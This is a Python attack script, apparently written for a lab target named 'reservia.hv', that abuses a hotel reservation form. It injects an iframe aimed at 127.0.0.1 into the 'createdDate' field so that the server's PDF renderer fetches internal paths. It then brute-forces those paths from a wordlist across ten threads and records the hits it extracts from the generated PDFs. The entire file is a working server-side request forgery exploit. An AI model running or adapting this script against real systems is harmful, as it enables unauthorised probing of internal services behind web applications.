import httpx
import re
import sys
import os
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from pdfminer.high_level import extract_text
from tempfile import NamedTemporaryFile

# Kiểm tra đầu vào
if len(sys.argv) != 2:
    print(f"Usage: python {sys.argv[0]} <path_to_wordlist>")
    sys.exit(1)

wordlist_path = sys.argv[1]
if not os.path.isfile(wordlist_path):
    print(f"[!] File '{wordlist_path}' not found.")
    sys.exit(1)

# Cấu hình
base_url = "http://reservia.hv"
post_url = f"{base_url}/hotels/647f0d2ba9108a79b01c63af"
headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0"
}

# Tải wordlist
with open(wordlist_path, "r") as f:
    paths = [line.strip() for line in f if line.strip()]

output_file = "scan_results.txt"
lock = threading.Lock()

def scan_path(path):
    try:
        with httpx.Client(follow_redirects=True, timeout=15) as client:
            payload = {
                "name": "test",
                "email": "test@a.com",
                "dateFrom": "8/4/2025",
                "dateTo": "8/4/2025",
                "guestCount": "1",
                "childrenCount": "0",
                "createdDate": f"<iframe src='http://127.0.0.1/{path}'></iframe>"
            }

            post_resp = client.post(post_url, data=payload, headers=headers)
            reservation_id_match = re.search(r'/hotels/reservations/([a-f0-9]{24})', post_resp.text)

            if reservation_id_match:
                reservation_id = reservation_id_match.group(1)
                get_url = f"{base_url}/hotels/reservations/{reservation_id}"
                get_resp = client.get(get_url, headers=headers)

                # Kiểm tra Content-Type là PDF
                if "application/pdf" in get_resp.headers.get("Content-Type", ""):
                    with NamedTemporaryFile(delete=False, suffix=".pdf") as temp_pdf:
                        temp_pdf.write(get_resp.content)
                        temp_pdf_path = temp_pdf.name

                    # Trích xuất nội dung PDF
                    pdf_text = extract_text(temp_pdf_path)
                    os.remove(temp_pdf_path)

                    if "Cannot GET" not in pdf_text:
                        result_line = f"{reservation_id} {path}"
                        print(result_line)
                        with lock:
                            with open(output_file, "a") as f:
                                f.write(result_line + "\n")
    except Exception as e:
        pass  # có thể thêm logging nếu cần

# Chạy đa luồng
with ThreadPoolExecutor(max_workers=10) as executor:
    futures = [executor.submit(scan_path, path) for path in paths]
    for future in as_completed(futures):
        pass
